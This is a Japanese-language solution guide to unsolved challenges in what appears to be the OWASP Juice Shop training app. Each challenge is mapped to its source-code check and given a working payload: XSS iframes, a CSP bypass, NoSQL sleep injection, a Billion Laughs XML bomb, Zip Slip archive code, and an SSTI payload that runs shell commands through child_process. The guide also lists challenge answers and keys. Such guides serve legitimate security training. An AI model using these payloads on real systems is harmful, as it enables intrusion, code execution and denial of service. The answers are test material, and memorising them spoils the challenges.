# Unsolved Challenges - 詳細調査

ソースコード分析に基づく未解決チャレンジの攻略ガイド。

---

## 難易度4

### 1. GDPR Data Theft

**ファイル:** `routes/dataErasure.ts`

**脆弱性:** Template Injection via `layout` パラメータ

```typescript
if (req.body.layout) {
  const filePath = path.resolve(req.body.layout).toLowerCase()
  // フィルタリングは ftp, ctf.key, encryptionkeys のみ
  if (!isForbiddenFile) {
    res.render('dataErasureResult', { ...req.body })
  }
}
```

**攻略方法:**
- `/api/PrivacyRequests` または `/dataerasure` で他ユーザーのデータにアクセス
- `layout` パラメータでテンプレートパスを操作

---

### 2. HTTP-Header XSS

**ファイル:** `routes/saveLoginIp.ts:22-25`

**検証条件:**
```typescript
challengeUtils.solveIf(challenges.httpHeaderXssChallenge, () => {
  return lastLoginIp === '<iframe src="javascript:alert(`xss`)">'
})
```

**攻略ペイロード:**
```http
POST /rest/user/login
X-Forwarded-For: <iframe src="javascript:alert(`xss`)">
```

**発火場所:** `/#/administration` でユーザー一覧表示時

---

### 3. NoSQL DoS

**ファイル:** `routes/showProductReviews.ts:31-38`

**検証条件:**
```typescript
db.reviewsCollection.find({ $where: 'this.product == ' + id })
// クエリ実行時間が 2000ms 以上で解決
challengeUtils.solveIf(challenges.noSqlCommandChallenge, () => {
  return (t1 - t0) > 2000
})
```

**攻略ペイロード:**
```
GET /rest/products/sleep(3000)/reviews
または
GET /rest/products/1;sleep(3000)//reviews
```

---

### 4. CSP Bypass

**ファイル:** `routes/userProfile.ts:88-92`

**検証条件:**
```typescript
// profileImage に ;script-src 'unsafe-inline' が含まれ、
// username に <script>alert(`xss`)</script> が含まれる
challengeUtils.solveIf(challenges.usernameXssChallenge, () => {
  return user?.profileImage.match(/;[ ]*script-src(.)*'unsafe-inline'/g) !== null
         && utils.contains(username, '<script>alert(`xss`)</script>')
})
```

**攻略手順:**
1. Profile Image URL を設定:
   ```
   https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'
   ```
2. Username を設定:
   ```
   <script>alert(`xss`)</script>
   ```

---

### 5. Server-side XSS Protection (Reflected XSS)

**ファイル:** `routes/trackOrder.ts:15-20`

**検証条件:**
```typescript
challengeUtils.solveIf(challenges.reflectedXssChallenge, () => {
  return utils.contains(id, '<iframe src="javascript:alert(`xss`)">')
})
```

**攻略ペイロード:**
```
GET /#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

**注意:** Docker 環境では sanitization が有効で動作しない可能性

---

## 難易度5

### 6. Reset Morty's Password

**ファイル:** `routes/resetPassword.ts:60`

**検証条件:**
```typescript
challengeUtils.solveIf(challenges.resetPasswordMortyChallenge, () => {
  return user.id === users.morty.id && answer === '5N0wb41L'
})
```

**攻略方法:**
1. メール: `morty@juice-sh.op`
2. セキュリティ質問の答え: `5N0wb41L`

**Rate Limit バイパス:** `X-Forwarded-For` ヘッダーを変更

---

### 7. XXE DoS (Billion Laughs)

**ファイル:** `routes/fileUpload.ts:88-95`

**検証条件:**
```typescript
// XML パース timeout (2000ms) で解決
if (utils.contains(err.message, 'Script execution timed out')) {
  challengeUtils.solve(challenges.xxeDosChallenge)
}
```

**攻略ペイロード (Quadratic Blowup):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

**エンドポイント:** `POST /file-upload` (Content-Type: application/xml)

---

### 8. Supply Chain Attack

**ファイル:** `routes/verify.ts:344-368`

**検証条件:**
```typescript
FeedbackModel.findAndCountAll({
  where: { comment: { [Op.or]: [
    { [Op.like]: '%eslint-scope/issues/39%' },
    { [Op.like]: '%npm:eslint-scope:20180712%' }
  ]}}
})
```

**攻略方法:** Contact フォームで以下を報告:
```
eslint-scope/issues/39
または
npm:eslint-scope:20180712
```

---

### 9. Cross-Site Imaging

**ファイル:** `routes/profileImageUrlUpload.ts`

**攻略方法:** SVG ファイルに JavaScript を埋め込む

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('xss')</script>
</svg>
```

**エンドポイント:** プロフィール画像として SVG をアップロード

---

## 難易度6

### 10. Arbitrary File Write (Zip Slip)

**ファイル:** `routes/fileUpload.ts:27-58`

**検証条件:**
```typescript
challengeUtils.solveIf(challenges.fileWriteChallenge, () => {
  return absolutePath === path.resolve('ftp/legal.md')
})
```

**攻略方法:**
1. ZIP 内のファイルパスを `../../ftp/legal.md` に設定
2. `POST /file-upload` でアップロード

**Python で ZIP 作成:**
```python
import zipfile
with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr('../../ftp/legal.md', 'Arbitrary content')
```

---

### 11. SSTi (Server-Side Template Injection)

**ファイル:** `routes/userProfile.ts:55-68`

**検証条件:**
```typescript
if (username?.match(/#{(.*)}/) !== null) {
  req.app.locals.abused_ssti_bug = true
  const code = username?.substring(2, username.length - 1)
  username = eval(code)  // ← 脆弱性
}
```

**攻略手順:**
1. Username を設定:
   ```
   #{global.process.mainModule.require('child_process').execSync('id').toString()}
   ```
2. チャレンジ検証:
   ```
   GET /solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
   ```

---

## 環境依存チャレンジ

| チャレンジ | 必要条件 | 理由 |
|-----------|---------|------|
| Reflected XSS | ローカル Node.js | Docker では sanitization 有効 |
| Blocked RCE DoS | ローカル Node.js | Docker でブロック |
| Reset Bjoern's Password | OAuth 設定 | Google OAuth 必要 |

---

## クイック攻略表

| チャレンジ | エンドポイント | ペイロード/答え |
|-----------|--------------|----------------|
| HTTP-Header XSS | POST /rest/user/login | `X-Forwarded-For: <iframe...>` |
| NoSQL DoS | GET /rest/products/{id}/reviews | `sleep(3000)` |
| CSP Bypass | POST /profile | profileImage に `;script-src 'unsafe-inline'` |
| Reflected XSS | GET /#/track-result?id= | `<iframe src="javascript:alert(\`xss\`)">` |
| Reset Morty | POST /rest/user/reset-password | 答え: `5N0wb41L` |
| XXE DoS | POST /file-upload | Billion Laughs XML |
| Supply Chain | POST /api/Feedbacks | `eslint-scope/issues/39` |
| Zip Slip | POST /file-upload | `../../ftp/legal.md` |
| SSTi | POST /profile | `#{global.process...}` |
